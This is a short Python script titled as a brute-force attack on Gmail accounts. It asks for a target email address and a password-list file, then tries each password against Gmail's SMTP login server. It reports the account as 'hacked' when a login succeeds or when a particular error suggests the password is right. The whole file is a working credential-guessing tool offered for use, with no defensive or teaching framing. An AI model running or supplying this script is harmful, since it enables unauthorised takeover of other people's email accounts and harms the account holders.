# Brute Force Attack on Gmail Account
# done by @Sri_Programmer
# python v3.7.2

import smtplib
import os

# Giving the options for the user
try:
   print('[1] start the attack')
   print('[2] exit')
   option = input('Python $> ')
   if option == '1':
      file_path = input('path of passwords file :')
   else:
      try:
         os.system('clear')
      except:
         os.system('cls')
      exit()
except KeyboardInterrupt:
   print('\n')
   quit()

try:
   pass_file = open(file_path,'r')
   pass_list = pass_file.readlines()
except FileNotFoundError:
   print('File is not found at specified location: {}'.format(file_path))
except KeyboardInterrupt:
   print('\n')
   quit()
except Exception:
   print('Something Went wrong...!')

def login():
    i = 0
    user_name = input('Target Emailid :')
    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    server.ehlo()
    for password in pass_list:
      i = i + 1
      print(str(i) + '/' + str(len(pass_list)))
      try:
         server.login(user_name, password)
         try:
            os.system('clear')
         except:
            os.system('cls')
         print('\n')
         print('[+] This Account Has Been Hacked Password :' + password)
         break
      except smtplib.SMTPAuthenticationError as e:
         error = str(e)
         if error[14] == '<':
            try:
               os.system('clear')
            except:
               os.system('cls')
            print('[+] this account has been hacked, password :' + password)
            break
         else:
            print('[!] password not found => ' + password)
      except KeyboardInterrupt:
         print('\n')
         quit()


login()
